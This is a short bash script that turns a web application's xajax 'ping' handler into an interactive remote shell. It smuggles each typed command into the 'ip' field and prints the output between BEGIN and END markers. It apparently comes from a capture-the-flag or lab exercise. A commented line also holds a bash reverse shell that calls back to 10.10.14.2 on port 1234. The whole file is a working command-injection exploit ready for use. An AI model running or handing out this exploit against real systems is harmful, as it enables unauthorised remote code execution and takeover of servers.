#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 #cmd='bash -i >& /dev/tcp/10.10.14.2/1234 0>&1'
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done